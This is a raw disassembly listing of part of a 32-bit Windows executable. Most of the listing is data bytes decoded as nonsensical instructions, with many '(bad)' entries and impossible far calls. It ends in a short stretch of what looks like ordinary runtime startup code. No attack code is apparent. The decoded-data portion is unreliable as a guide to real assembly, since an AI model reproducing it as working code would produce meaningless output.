  423c7c:	(bad)  
  423c7d:	in     al,0x46
  423c7f:	pop    ecx
  423c80:	mov    eax,0xab454915
  423c85:	addr16 out dx,eax
  423c87:	add    al,0xf7
  423c89:	xlat   BYTE PTR ds:[ebx]
  423c8a:	or     ebx,edi
  423c8c:	mov    ah,al
  423c8e:	enter  0xdf20,0xda
  423c92:	push   edx
  423c93:	ret    0x114a
  423c96:	dec    edx
  423c97:	cld    
  423c98:	rol    BYTE PTR [edx+0x6a0db4a],cl
  423c9e:	xchg   ebp,eax
  423c9f:	icebp  
  423ca0:	jo     0x423cf8
  423ca2:	or     eax,0x44eddacb
  423ca7:	inc    ebp
  423ca8:	in     eax,0xca
  423caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cab:	adc    BYTE PTR [esi],0x53
  423cae:	frstor [edi+0x77]
  423cb1:	fsubr  QWORD PTR [eax+eax*1+0x3b]
  423cb5:	in     al,0x67
  423cb7:	push   edx
  423cb8:	xchg   DWORD PTR [ebx],ebx
  423cba:	jle    0x423ccc
  423cbc:	call   WORD PTR [ebx+edx*4]
  423cc0:	push   0xffffffff
  423cc2:	fisubr DWORD PTR [esi-0x36]
  423cc5:	mov    ds:0x4a60e9,al
  423cca:	call   0xd84c:0x4677bafc
  423cd1:	std    
  423cd2:	cdq    
  423cd3:	mov    esp,0x6eb308a7
  423cd8:	popa   
  423cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423cda:	fcomp  QWORD PTR [esi-0x59]
  423cdd:	jl     0x423d16
  423cdf:	inc    edi
  423ce0:	mov    eax,ds:0xcc0823af
  423ce5:	mov    eax,ds:0x21e6a1ef
  423cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ceb:	cmp    ebp,DWORD PTR [ebp-0x34c3b9c1]
  423cf1:	jne    0x423d2b
  423cf3:	cmp    ebp,esp
  423cf5:	xor    eax,0xf4fc1e03
  423cfa:	pop    ebp
  423cfb:	fisubr WORD PTR [ebx-0x3b]
  423cfe:	(bad)  
  423cff:	mov    ebp,0x858d661f
  423d04:	cmp    ebp,DWORD PTR [eax]
  423d06:	(bad)  
  423d07:	mov    ds:0xda1a15f0,eax
  423d0c:	xor    DWORD PTR [ebp-0x7400499],edi
  423d12:	aam    0xcf
  423d14:	std    
  423d15:	sbb    al,ah
  423d17:	xchg   ebp,eax
  423d18:	es xchg esi,eax
  423d1a:	inc    esi
  423d1b:	mov    al,0xea
  423d1d:	imul   edi,DWORD PTR [esi+0x3],0x48
  423d21:	mov    ah,0xa8
  423d23:	shr    DWORD PTR [edx+0x3e368d7b],0x87
  423d2a:	dec    ebx
  423d2b:	jae    0x423d42
  423d2d:	out    0xcc,eax
  423d2f:	daa    
  423d30:	(bad)  
  423d31:	cmp    al,0x6
  423d33:	jg     0x423ce9
  423d35:	fs inc ebp
  423d37:	out    0x7,eax
  423d39:	dec    ebx
  423d3a:	aad    0xac
  423d3c:	mov    ecx,0x9078fec1
  423d41:	inc    edi
  423d42:	dec    ebp
  423d43:	enter  0xf7d8,0xb4
  423d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d48:	mov    ds:0x4f307af8,eax
  423d4d:	or     DWORD PTR [edi+0x1e],0xa00c0e55
  423d54:	xor    al,0x45
  423d56:	push   esp
  423d57:	mov    edi,0xebc5fc4d
  423d5c:	pop    DWORD PTR [edx]
  423d5e:	adc    ch,0xb2
  423d61:	pop    edx
  423d62:	adc    BYTE PTR [ecx],0xa9
  423d65:	lahf   
  423d66:	lea    esi,[eax+0x77]
  423d69:	push   edx
  423d6a:	fadd   QWORD PTR [edx+0x4f3b5b7f]
  423d70:	bound  ebx,QWORD PTR [edi+ebp*1-0x50]
  423d74:	and    eax,0x7b0a720c
  423d79:	inc    esp
  423d7a:	les    ebx,FWORD PTR [eax+0x334cec94]
  423d80:	bound  ebp,QWORD PTR [eax]
  423d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d83:	lock push esi
  423d85:	(bad)  
  423d87:	sbb    al,bh
  423d89:	sbb    al,0x4c
  423d8b:	pop    ecx
  423d8c:	out    0xd6,eax
  423d8e:	int    0x8e
  423d90:	push   edx
  423d91:	mov    ebx,0x618921cf
  423d96:	retfw  0x4b91
  423d9a:	push   ss
  423d9b:	(bad)  
  423d9c:	ins    BYTE PTR es:[edi],dx
  423d9d:	leave  
  423d9e:	or     DWORD PTR [ebx-0x41dc4ce3],eax
  423da4:	fst    QWORD PTR [eax+0x803d45]
  423daa:	jae    0x423dbc
  423dac:	fistp  DWORD PTR [esi]
  423dae:	das    
  423daf:	mov    ebx,0xf330e5d1
  423db4:	test   ebp,esp
  423db6:	inc    edx
  423db7:	mov    al,ds:0xbe2109a
  423dbc:	outs   dx,BYTE PTR ds:[esi]
  423dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423dbe:	rcr    DWORD PTR [ebp+0x39],1
  423dc1:	es pop ds
  423dc3:	inc    ecx
  423dc4:	out    dx,al
  423dc5:	ds mov ch,bh
  423dc8:	loope  0x423dc1
  423dca:	loope  0x423dfc
  423dcc:	mov    ?,WORD PTR [ebx-0xa]
  423dcf:	mov    al,ss:0x5a949601
  423dd5:	xchg   esi,eax
  423dd6:	daa    
  423dd7:	imul   DWORD PTR [ebp+0x79]
  423dda:	call   0xea1:0xc4c46574
  423de1:	cld    
  423de2:	sub    DWORD PTR [esi-0x5205079a],0x51c3cd51
  423dec:	jge    0x423db1
  423dee:	xchg   ebx,eax
  423def:	loop   0x423e51
  423df1:	mov    bh,0x61
  423df3:	into   
  423df4:	cs jle 0x423da7
  423df7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423df8:	jecxz  0x423de8
  423dfa:	push   cs
  423dfb:	mov    ebx,0x602958b2
  423e00:	mov    eax,ds:0x93f492fe
  423e05:	ret    0xfe76
  423e08:	dec    esi
  423e09:	add    ch,BYTE PTR [edi-0x68a10fec]
  423e0f:	out    dx,eax
  423e10:	(bad)  
  423e12:	test   ah,dh
  423e14:	ss dec eax
  423e16:	(bad)  
  423e17:	xor    esp,DWORD PTR [edx+0x68]
  423e1a:	fwait
  423e1b:	inc    ebp
  423e1c:	sub    ch,ch
  423e1e:	test   BYTE PTR [eax+0x17],al
  423e21:	mov    ds:0x3ca0ab4d,eax
  423e26:	retf   
  423e27:	iret   
  423e28:	sub    BYTE PTR [ebx-0x68197597],0xb1
  423e2f:	stos   BYTE PTR es:[edi],al
  423e30:	ins    BYTE PTR es:[edi],dx
  423e31:	cs (bad) 
  423e33:	inc    eax
  423e34:	popa   
  423e35:	ins    BYTE PTR es:[edi],dx
  423e36:	test   BYTE PTR [ecx],ch
  423e38:	lea    ebx,[edx]
  423e3a:	push   es
  423e3b:	or     eax,0x1a7629af
  423e40:	cmp    ah,dl
  423e42:	sbb    eax,0x3d7e0d77
  423e47:	adc    eax,0xfc2156a2
  423e4c:	call   0xbd7b:0x46a1b32f
  423e53:	lods   al,BYTE PTR ds:[si]
  423e55:	sbb    al,0x98
  423e57:	inc    edi
  423e58:	jle    0x423e89
  423e5a:	sti    
  423e5b:	mov    edx,0xcba88ba3
  423e60:	jo     0x423e75
  423e62:	call   0xc0d1:0xead0720e
  423e69:	mov    BYTE PTR [ebp+0x5a9ffc12],cl
  423e6f:	neg    edi
  423e71:	xor    DWORD PTR [eax-0x69],0x39
  423e75:	cmc    
  423e76:	or     eax,0x9c693eba
  423e7b:	(bad)  
  423e7c:	repz mov esp,0x9f4f7273
  423e82:	mov    esi,0xce2250d2
  423e87:	cli    
  423e88:	lea    eax,[edi+0x26]
  423e8b:	or     al,BYTE PTR [ebx-0x69b4630a]
  423e91:	jns    0x423ede
  423e93:	scas   eax,DWORD PTR es:[edi]
  423e94:	cmp    esi,esi
  423e96:	mov    ds:0xca3e3607,eax
  423e9b:	jo     0x423f05
  423e9d:	jg     0x423e45
  423e9f:	outs   dx,DWORD PTR ds:[esi]
  423ea0:	rcl    BYTE PTR [edi+0x4a07280b],0x13
  423ea7:	add    BYTE PTR [ecx-0x71],cl
  423eaa:	push   0xffffffed
  423eac:	and    eax,0x32a997a2
  423eb1:	push   es
  423eb2:	shr    DWORD PTR [ebp+esi*1+0x7a],cl
  423eb6:	mov    ds:0x95886d7f,al
  423ebb:	pop    edx
  423ebc:	mov    dh,0x98
  423ebe:	sub    ecx,esi
  423ec0:	mov    al,ds:0x14c40fb8
  423ec5:	imul   ebp,eax,0xcc95ac0
  423ecb:	mov    eax,DWORD PTR [ebx+0x6958d69c]
  423ed1:	adc    DWORD PTR [edx-0x2a],esp
  423ed4:	test   BYTE PTR [esi+0x17eae11e],dl
  423eda:	inc    DWORD PTR [edx+0x168c6004]
  423ee0:	push   0x67
  423ee2:	push   0xffffff9c
  423ee4:	jae    0x423f52
  423ee6:	adc    eax,0xff10adf9
  423eeb:	scas   eax,DWORD PTR es:[edi]
  423eec:	ret    
  423eed:	cdq    
  423eee:	jns    0x423ec9
  423ef0:	repnz mov dl,0x7b
  423ef3:	shr    BYTE PTR [edi-0x6a],0x42
  423ef7:	add    ebx,edi
  423ef9:	mov    dl,bl
  423efb:	pop    eax
  423efc:	pop    ecx
  423efd:	loope  0x423f10
  423eff:	sub    edx,DWORD PTR [ecx-0x5429a6d3]
  423f05:	pop    ds
  423f06:	ja     0x423ed8
  423f08:	dec    ebx
  423f09:	test   al,0xb7
  423f0b:	xor    bh,dh
  423f0d:	loop   0x423f23
  423f0f:	xor    ebp,ecx
  423f11:	push   ss
  423f12:	loope  0x423f2f
  423f14:	dec    BYTE PTR [edi-0x1c]
  423f17:	cmc    
  423f18:	xchg   esp,eax
  423f19:	ja     0x423f0a
  423f1b:	fldenv [esi]
  423f1d:	lea    esp,[ebx-0x2d254fc7]
  423f23:	je     0x423f73
  423f25:	jae    0x423ef2
  423f27:	or     eax,ecx
  423f29:	sahf   
  423f2a:	test   eax,0x6d45d690
  423f2f:	outs   dx,DWORD PTR es:[esi]
  423f31:	push   ss
  423f32:	loope  0x423eeb
  423f34:	dec    esi
  423f35:	xchg   ebp,eax
  423f36:	cs xor al,0x56
  423f39:	inc    eax
  423f3a:	imul   edx,DWORD PTR [ebp-0x5288a532],0xffffffe9
  423f41:	add    DWORD PTR [edx],esi
  423f43:	ret    
  423f44:	test   esi,ebx
  423f46:	mov    ch,0x81
  423f48:	addr16 fwait
  423f4a:	push   ss
  423f4b:	xor    DWORD PTR [edi+ebp*2],esi
  423f4e:	push   esi
  423f4f:	icebp  
  423f50:	jge    0x423efa
  423f52:	cmp    al,0xa7
  423f54:	stos   DWORD PTR es:[edi],eax
  423f55:	inc    eax
  423f56:	pusha  
  423f57:	(bad)  
  423f58:	fsub   st,st(4)
  423f5a:	adc    eax,DWORD PTR [eax+0x7fb0e9fc]
  423f60:	push   es
  423f61:	mov    ebp,0xca4dd987
  423f66:	cmp    DWORD PTR [esi+edx*8-0x4e],eax
  423f6a:	int    0x87
  423f6c:	scas   al,BYTE PTR es:[edi]
  423f6d:	addr16 push 0x705f1b7c
  423f73:	into   
  423f74:	xchg   ebp,eax
  423f75:	in     eax,0x57
  423f77:	jl     0x423f76
  423f79:	mov    ds:0xfdb12c11,al
  423f7e:	jne    0x423f1a
  423f80:	xor    DWORD PTR [edx],edx
  423f82:	mov    esi,0xf289aa0d
  423f87:	inc    esp
  423f88:	push   eax
  423f89:	pop    edi
  423f8a:	inc    edx
  423f8b:	loope  0x423feb
  423f8d:	sbb    eax,0xe75d4b62
  423f92:	mov    eax,0x55be69c2
  423f97:	je     0x423fcd
  423f99:	and    eax,0x65ea777c
  423f9e:	shr    esp,0xb2
  423fa1:	imul   ecx,DWORD PTR [ebp-0x358a68a7],0x6918d30b
  423fab:	ret    
  423fac:	aaa    
  423fad:	cmp    BYTE PTR [ebp-0x2e48930d],0x78
  423fb4:	or     al,0xbd
  423fb6:	sbb    eax,0xf396cd
  423fbb:	fsubr  DWORD PTR [ecx]
  423fbd:	sbb    al,0x15
  423fbf:	ins    BYTE PTR es:[edi],dx
  423fc0:	push   eax
  423fc1:	pop    ecx
  423fc2:	push   esi
  423fc3:	mov    ds:0x9e40464a,al
  423fc8:	or     esp,edi
  423fca:	mov    dh,0xc8
  423fcc:	jmp    0x80f0:0x19f06b47
  423fd3:	xor    DWORD PTR [edx-0x79],edi
  423fd6:	es xchg edi,eax
  423fd8:	cwde   
  423fd9:	fcom   QWORD PTR [ebx+esi*2]
  423fdc:	scas   eax,DWORD PTR es:[edi]
  423fdd:	adc    DWORD PTR [ebx],ecx
  423fdf:	dec    ebp
  423fe0:	mov    bh,BYTE PTR [ecx-0x13]
  423fe3:	and    edx,DWORD PTR [edi+0x6d]
  423fe6:	test   eax,0x2af1ccc1
  423feb:	sbb    al,al
  423fed:	push   0x82987a66
  423ff2:	and    al,0x3
  423ff4:	jns    0x423fad
  423ff6:	jp     0x423fb4
  423ff8:	cli    
  423ff9:	test   esp,esi
  423ffb:	xor    bl,dl
  423ffd:	ins    DWORD PTR es:[edi],dx
  423ffe:	add    BYTE PTR [ebx-0x74a44e28],0xa6
  424005:	sbb    ch,BYTE PTR [ecx-0x2ded977f]
  42400b:	inc    eax
  42400c:	das    
  42400d:	adc    BYTE PTR [eax],0x63
  424010:	test   al,0x65
  424012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424013:	ret    0x29e4
  424016:	ins    DWORD PTR es:[edi],dx
  424017:	into   
  424018:	retf   0x665a
  42401b:	mov    bh,0xa4
  42401d:	sub    esp,esi
  42401f:	adc    bh,bl
  424021:	or     al,0xfd
  424023:	xchg   ecx,eax
  424024:	or     DWORD PTR ds:0x5b9eeba4,edx
  42402a:	loope  0x4240a0
  42402c:	mov    bh,0x2d
  42402e:	pop    esi
  42402f:	sti    
  424030:	jecxz  0x423ff9
  424032:	icebp  
  424033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424034:	jmp    0x2835:0xdff1caf8
  42403b:	mov    eax,0x9aa30a3a
  424040:	and    eax,0xbe9ab9bd
  424045:	cmp    DWORD PTR [edx],0x4b940058
  42404b:	jns    0x424002
  42404d:	in     al,0xc4
  42404f:	mov    bl,0x23
  424051:	cmp    dl,BYTE PTR [edx]
  424053:	mov    edi,0x474d70b6
  424058:	lock or ebx,esp
  42405b:	xchg   ecx,eax
  42405c:	push   ds
  42405d:	xor    DWORD PTR [ebx+0x19],edi
  424060:	mov    ebp,DWORD PTR [esi-0x5c]
  424063:	(bad)  
  424064:	cld    
  424065:	sar    ah,1
  424067:	or     DWORD PTR [ebx+0x15],edi
  42406a:	mov    ecx,0x71e4ccc0
  42406f:	leave  
  424070:	xlat   BYTE PTR ds:[ebx]
  424071:	test   BYTE PTR [ecx+0x42],0x80
  424075:	nop
  424076:	(bad)  
  424077:	scas   al,BYTE PTR es:[edi]
  424078:	push   esp
  424079:	add    edx,esi
  42407b:	jecxz  0x4240e8
  42407d:	xchg   esp,eax
  42407e:	bound  ecx,QWORD PTR [ebx+0x13]
  424081:	jg     0x424098
  424083:	mov    dh,0x3d
  424085:	pop    edi
  424086:	inc    ecx
  424087:	xchg   ebp,eax
  424088:	daa    
  424089:	mov    gs,ebp
  42408b:	cli    
  42408c:	loopne 0x4240a7
  42408e:	push   ebx
  42408f:	scas   eax,DWORD PTR es:[edi]
  424090:	sbb    al,0xbe
  424092:	int    0x94
  424094:	retf   
  424095:	jns    0x42407a
  424097:	clc    
  424098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424099:	dec    ebp
  42409a:	cmp    BYTE PTR es:[ebp+0x41],al
  42409e:	fsubp  st(5),st
  4240a0:	inc    ecx
  4240a1:	out    0x4,al
  4240a3:	arpl   WORD PTR [ebp+0x2049a150],sp
  4240a9:	cli    
  4240aa:	dec    edx
  4240ab:	lds    edx,FWORD PTR [esi+0x2aac6f80]
  4240b1:	or     al,BYTE PTR [edx-0x8]
  4240b4:	out    dx,al
  4240b5:	sbb    BYTE PTR [edx-0x19d54094],ch
  4240bb:	xor    al,BYTE PTR [ebx+0xd4b1cb1]
  4240c1:	clc    
  4240c2:	imul   ebp,DWORD PTR [ecx-0x642c825a],0x53
  4240c9:	js     0x4240ba
  4240cb:	enter  0xdaa7,0xd
  4240cf:	icebp  
  4240d0:	push   edx
  4240d1:	add    eax,0xe374d8e3
  4240d6:	pop    esp
  4240d7:	adc    DWORD PTR [edi],0xced43b88
  4240dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240de:	push   ecx
  4240df:	loopne 0x4240b2
  4240e1:	stos   BYTE PTR es:[edi],al
  4240e2:	jb     0x424064
  4240e4:	(bad)  
  4240e5:	jmp    0x98be717f
  4240ea:	loope  0x424168
  4240ec:	cmp    al,0x1c
  4240ee:	stc    
  4240ef:	xor    al,0xcf
  4240f1:	jp     0x424158
  4240f3:	ins    DWORD PTR es:[edi],dx
  4240f4:	mov    ds:0xc6ae8433,al
  4240f9:	push   ds
  4240fa:	xchg   edi,eax
  4240fb:	out    0x12,al
  4240fd:	jg     0x424148
  4240ff:	inc    ebp
  424100:	inc    edi
  424101:	push   0xd644d4ea
  424106:	cli    
  424107:	push   ebx
  424108:	pop    ebp
  424109:	in     al,0x11
  42410b:	rcr    ebp,1
  42410d:	and    eax,0x423b7e83
  424112:	lock fcom DWORD PTR [eax+0x123d8354]
  424119:	out    dx,eax
  42411a:	imul   ebx,DWORD PTR [ecx+0x7a],0x6a
  42411e:	adc    eax,0xd0052b18
  424123:	xchg   edi,eax
  424124:	or     al,ah
  424126:	mov    ds:0xb8f015ee,eax
  42412b:	(bad)  
  42412c:	scas   al,BYTE PTR es:[edi]
  42412d:	and    DWORD PTR [eax-0x3f],esp
  424130:	sbb    BYTE PTR [edi-0x3e271f9e],cl
  424136:	rcl    BYTE PTR [edx-0x314a9507],0xc9
  42413d:	repnz div dl
  424140:	in     al,dx
  424141:	sub    edi,DWORD PTR [ebx-0x26]
  424144:	cmp    ch,cl
  424146:	jmp    0xe6c7:0xe95f52e
  42414d:	rcl    DWORD PTR [ebp+0x14],1
  424150:	ja     0x42414c
  424152:	icebp  
  424153:	ret    
  424154:	cmp    eax,0xcabac6b2
  424159:	mov    al,0x62
  42415b:	mov    ds:0xa27e8a39,al
  424160:	pop    ecx
  424161:	aad    0x49
  424163:	pop    ebx
  424164:	jl     0x42416b
  424166:	sub    eax,0x88c9a24
  42416b:	lea    edi,[edx]
  42416d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42416e:	pop    ebx
  42416f:	xor    DWORD PTR [edi],edi
  424171:	ins    DWORD PTR es:[edi],dx
  424172:	shl    DWORD PTR [esi],0x87
  424175:	ret    
  424176:	cmp    esi,DWORD PTR [ebx-0x5ea799f3]
  42417c:	sbb    bh,cl
  42417e:	lahf   
  42417f:	int3   
  424180:	jb     0x42416c
  424182:	mov    ebx,0xb8b6bfef
  424187:	dec    esp
  424188:	fstp   DWORD PTR [ebx+0x49fef6ae]
  42418e:	ror    BYTE PTR [edx+0x2b],1
  424191:	fwait
  424192:	dec    eax
  424193:	mov    al,ds:0x413b1d12
  424198:	pusha  
  424199:	and    DWORD PTR [esi+0xe],edi
  42419c:	mov    dl,0x3c
  42419e:	mov    eax,ds:0x9c7f5b85
  4241a3:	adc    bh,dl
  4241a5:	rep ins DWORD PTR es:[edi],dx
  4241a7:	add    BYTE PTR [edi-0x78],dh
  4241aa:	xor    ebp,ebx
  4241ac:	inc    esp
  4241ad:	int    0xc6
  4241af:	shl    BYTE PTR [eax],1
  4241b1:	js     0x424197
  4241b3:	fs daa 
  4241b5:	xchg   ecx,eax
  4241b6:	and    al,0x88
  4241b8:	stos   DWORD PTR es:[edi],eax
  4241b9:	pop    edx
  4241ba:	adc    eax,0xdf6baf1f
  4241bf:	mov    bh,0x24
  4241c2:	outs   dx,BYTE PTR ds:[esi]
  4241c3:	(bad)  
  4241c4:	mov    ch,0x74
  4241c6:	in     al,0xd5
  4241c8:	mov    BYTE PTR [ecx-0x12ef918d],bl
  4241ce:	(bad)  [ebx+ecx*8-0x4c]
  4241d2:	jns    0x424217
  4241d4:	call   0xb1ea:0x4926dbc7
  4241db:	xchg   ebp,eax
  4241dc:	and    edi,ecx
  4241de:	lock das 
  4241e0:	jne    0x42420a
  4241e2:	lea    ebp,[edi-0x59e1d857]
  4241e8:	adc    eax,0xb5f66bd
  4241ed:	xor    edi,ebp
  4241ef:	add    eax,0xa16419bf
  4241f4:	(bad)  
  4241f5:	or     edx,esp
  4241f7:	fcmovu st,st(6)
  4241f9:	sahf   
  4241fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241fb:	sbb    edx,0x2894b80f
  424201:	push   edi
  424202:	ret    0x3b6a
  424205:	pop    ecx
  424206:	test   al,0xce
  424208:	fisubr WORD PTR [edi]
  42420a:	pop    es
  42420b:	pop    edi
  42420c:	loop   0x42427c
  42420e:	movhps QWORD PTR [edi-0x71979109],xmm2
  424215:	not    DWORD PTR ss:[eax+0x4b5cb2a]
  42421c:	in     ax,0x52
  42421f:	mov    ebp,0xcafdea13
  424224:	lock push esi
  424226:	push   0xd97ec67c
  42422b:	mov    ebp,0xa4ec9978
  424230:	icebp  
  424231:	xchg   ebp,eax
  424232:	jmp    esp
  424234:	stos   DWORD PTR es:[edi],eax
  424235:	xchg   ebx,eax
  424236:	push   edx
  424237:	jp     0x42420b
  424239:	gs cmp esi,edi
  42423c:	pop    ds
  42423d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42423e:	pop    edx
  42423f:	imul   ecx,DWORD PTR [ebx-0x40],0xc13c07ff
  424246:	jnp    0x424291
  424248:	jge    0x42421d
  42424a:	jb     0x424241
  42424c:	jl     0x4241e8
  42424e:	rcr    DWORD PTR [eax],0x19
  424251:	nop
  424252:	fld    QWORD PTR [eax+ecx*4-0x37]
  424256:	and    bh,BYTE PTR [edi-0x65]
  424259:	mov    esi,ds
  42425b:	dec    esi
  42425c:	fisttp DWORD PTR [ebx-0x35fbf319]
  424262:	outs   dx,DWORD PTR ds:[esi]
  424263:	xor    ebx,edx
  424265:	jnp    0x42421a
  424267:	lods   al,BYTE PTR ds:[esi]
  424268:	adc    eax,0xcb347209
  42426d:	dec    ebp
  42426e:	mov    edx,0xbbb15d07
  424273:	push   esi
  424274:	loopne 0x4242e1
  424276:	sahf   
  424277:	sub    DWORD PTR [ecx+0x77e8d451],ecx
  42427d:	sub    bh,BYTE PTR [ecx+0x434d1055]
  424283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424284:	jg     0x424238
  424286:	xlat   BYTE PTR ds:[ebx]
  424287:	adc    bl,dl
  424289:	clc    
  42428a:	jns    0x424233
  42428c:	sbb    edi,DWORD PTR [edi-0x65]
  42428f:	or     DWORD PTR [esi+0x6],0x6a
  424293:	in     al,0x36
  424295:	daa    
  424296:	fbstp  TBYTE PTR [esi+0x5e16bcf3]
  42429c:	dec    eax
  42429d:	pushf  
  42429e:	push   ebx
  42429f:	int3   
  4242a0:	hlt    
  4242a1:	jle    0x424295
  4242a3:	popf   
  4242a4:	pop    es
  4242a5:	cli    
  4242a6:	imul   eax,DWORD PTR [edx+0x2cf02133],0xb
  4242ad:	repz sbb DWORD PTR [edx+0x39],ebx
  4242b1:	add    ch,BYTE PTR ds:0x25ba5f5e
  4242b7:	scas   al,BYTE PTR es:[edi]
  4242b8:	or     BYTE PTR [edi-0x48],bl
  4242bb:	(bad)  
  4242bc:	fst    DWORD PTR [edx]
  4242be:	push   eax
  4242bf:	sub    BYTE PTR [ebp+0x330286ff],bl
  4242c5:	fdiv   QWORD PTR [edx+0x420c444b]
  4242cb:	sub    al,0xf8
  4242cd:	jne    0x424262
  4242cf:	pop    edi
  4242d0:	sbb    ebx,DWORD PTR [ebx-0x1e4e908]
  4242d6:	imul   edx,esi,0xc4638a84
  4242dc:	inc    esi
  4242dd:	call   0xf96798a9
  4242e2:	lds    ebx,FWORD PTR ds:0x8f6ed502
  4242e8:	out    dx,al
  4242e9:	enter  0x6a03,0xb6
  4242ed:	xor    ch,BYTE PTR [ecx-0x13b63b2b]
  4242f3:	scas   al,BYTE PTR es:[edi]
  4242f4:	ja     0x4242ab
  4242f6:	pop    edx
  4242f7:	addr16 sbb ah,bh
  4242fa:	xlat   BYTE PTR ds:[ebx]
  4242fb:	push   esi
  4242fc:	xchg   BYTE PTR [esi-0x12],dh
  4242ff:	sub    eax,0x62e202a0
  424304:	xchg   ecx,eax
  424305:	adc    DWORD PTR [edi+0x4e4c6b9a],esi
  42430b:	mov    ch,0x29
  42430d:	out    dx,eax
  42430e:	repnz inc DWORD PTR [ebx]
  424311:	mov    ds:0x8557201a,al
  424316:	jg     0x424375
  424318:	lahf   
  424319:	js     0x424374
  42431b:	pop    ds
  42431c:	jnp    0x4242d5
  42431e:	scas   al,BYTE PTR es:[edi]
  42431f:	push   esi
  424320:	xchg   esi,eax
  424321:	cmc    
  424322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424323:	jl     0x4242ca
  424325:	repnz xchg edi,esp
  424328:	push   esp
  424329:	ret    
  42432a:	fisttp WORD PTR [edi]
  42432c:	xor    DWORD PTR ds:0xc40bedfb,edi
  424332:	jnp    0x424305
  424334:	aaa    
  424335:	int3   
  424336:	pop    ebx
  424337:	xchg   ecx,eax
  424338:	dec    esp
  424339:	push   ds
  42433a:	jmp    0x424312
  42433c:	add    edi,edi
  42433e:	dec    esi
  42433f:	pop    eax
  424340:	sbb    dl,BYTE PTR [edi-0x71]
  424343:	mov    esi,0xecf14009
  424348:	pushf  
  424349:	adc    eax,0x3d58bad4
  42434e:	enter  0x3e20,0x61
  424352:	mov    al,0xea
  424354:	popa   
  424355:	sub    al,0x34
  424357:	out    dx,ax
  424359:	sbb    DWORD PTR [edx],edx
  42435b:	xor    eax,0xd5e4e40c
  424360:	imul   esp,DWORD PTR [eax],0x56
  424363:	enter  0x4c18,0x90
  424367:	addr16 ja 0x424334
  42436a:	scas   eax,DWORD PTR es:[edi]
  42436b:	std    
  42436c:	or     BYTE PTR [ebx-0x35af7132],ah
  424372:	repz pop esp
  424374:	push   eax
  424375:	repz jo 0x42435c
  424378:	aaa    
  424379:	and    eax,0xb2546e48
  42437e:	jbe    0x424354
  424380:	jne    0x42434c
  424382:	retf   
  424383:	cmp    al,0x6c
  424385:	mov    dl,0xe7
  424387:	cmc    
  424388:	mov    WORD PTR [eax],?
  42438a:	(bad)  [ebx]
  42438c:	scas   al,BYTE PTR es:[edi]
  42438d:	imul   DWORD PTR [edx+0x6a713c47]
  424393:	push   ebx
  424394:	xchg   ebp,eax
  424395:	jbe    0x424323
  424397:	pop    es
  424398:	std    
  424399:	or     DWORD PTR [esi],0x38
  42439c:	push   edx
  42439d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42439e:	sbb    al,0xc5
  4243a0:	stos   DWORD PTR es:[edi],eax
  4243a1:	mov    DWORD PTR gs:[ebx+0x61],ebp
  4243a5:	cld    
  4243a6:	in     al,dx
  4243a7:	inc    edx
  4243a8:	inc    edx
  4243a9:	pop    ss
  4243aa:	xor    eax,0x5f6bc45e
  4243af:	cld    
  4243b0:	or     al,0xde
  4243b2:	ins    BYTE PTR es:[edi],dx
  4243b3:	add    al,0xb0
  4243b5:	pop    ds
  4243b6:	pusha  
  4243b7:	out    dx,al
  4243b8:	imul   eax,ecx,0x60a66526
  4243be:	ret    0x7d16
  4243c1:	call   0x4cd:0x423fae3b
  4243c8:	ret    0xff0a
  4243cb:	ins    DWORD PTR es:[edi],dx
  4243cc:	jae    0x4243b2
  4243ce:	enter  0x6ce8,0x64
  4243d2:	popf   
  4243d3:	sbb    edi,ebp
  4243d5:	jle    0x424365
  4243d7:	cmp    DWORD PTR [ebp+0x18],0x6c
  4243db:	add    edi,edi
  4243dd:	add    esi,DWORD PTR [eax+0x44cd0169]
  4243e3:	rcr    BYTE PTR [edx-0x5e],0x62
  4243e7:	add    dh,ah
  4243e9:	shl    DWORD PTR [edx+0x24847fed],1
  4243ef:	hlt    
  4243f0:	mov    esi,0x43030f81
  4243f5:	das    
  4243f6:	dec    ebx
  4243f7:	pop    eax
  4243f8:	repz or BYTE PTR [edi+0x75],bh
  4243fc:	das    
  4243fd:	dec    ebx
  4243fe:	push   0x0
  424400:	push   0x0
  424402:	call   0x424410
  424407:	xor    eax,eax
  424409:	add    esp,0x10
  42440c:	ret    0x10
  42440f:	nop
  424410:	jmp    DWORD PTR ds:0x429114
  424416:	cmp    DWORD PTR ds:0x45dabc,0x1
  42441d:	jne    0x424424
  42441f:	call   0x424962
  424424:	push   DWORD PTR [esp+0x4]
  424428:	call   0x4247eb
  42442d:	push   0xff
  424432:	call   DWORD PTR ds:0x45d1c0
  424438:	pop    ecx
  424439:	pop    ecx
  42443a:	ret    
  42443b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424442:	jne    0x424449
  424444:	call   0x424962
  424449:	push   DWORD PTR [esp+0x4]
  42444d:	call   0x4247eb
  424452:	push   0xff
  424457:	call   0x424631
  42445c:	pop    ecx
  42445d:	pop    ecx
  42445e:	ret    
  42445f:	push   0x60
  424461:	push   0x429228
  424466:	call   0x425350
  42446b:	mov    edi,0x94
  424470:	mov    eax,edi
  424472:	call   0x4253a0
  424477:	mov    DWORD PTR [ebp-0x18],esp
  42447a:	mov    esi,esp
  42447c:	mov    DWORD PTR [esi],edi
  42447e:	push   esi
  42447f:	call   DWORD PTR ds:0x429058
  424485:	mov    ecx,DWORD PTR [esi+0x10]
  424488:	mov    DWORD PTR ds:0x45dac4,ecx
  42448e:	mov    eax,DWORD PTR [esi+0x4]
  424491:	mov    ds:0x45dad0,eax
